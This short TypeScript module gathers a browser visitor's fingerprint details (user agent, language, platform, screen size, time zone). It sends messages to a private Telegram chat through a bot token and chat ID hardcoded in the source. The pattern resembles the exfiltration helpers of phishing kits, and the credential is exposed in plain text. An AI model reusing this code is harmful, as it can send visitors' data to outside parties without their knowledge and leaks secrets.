const TELEGRAM_TOKEN = "7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I";
const CHAT_ID = "6185375878";
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

export interface SystemInfo {
  userAgent: string;
  language: string;
  platform: string;
  screenResolution: string;
  timeZone: string;
  timestamp: string;
}

export const sendToTelegram = async (message: string) => {
  try {
    await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });
  } catch (error) {
    console.error('Error sending to Telegram:', error);
  }
};

export const collectSystemInfo = (): SystemInfo => {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timestamp: new Date().toISOString(),
  };
};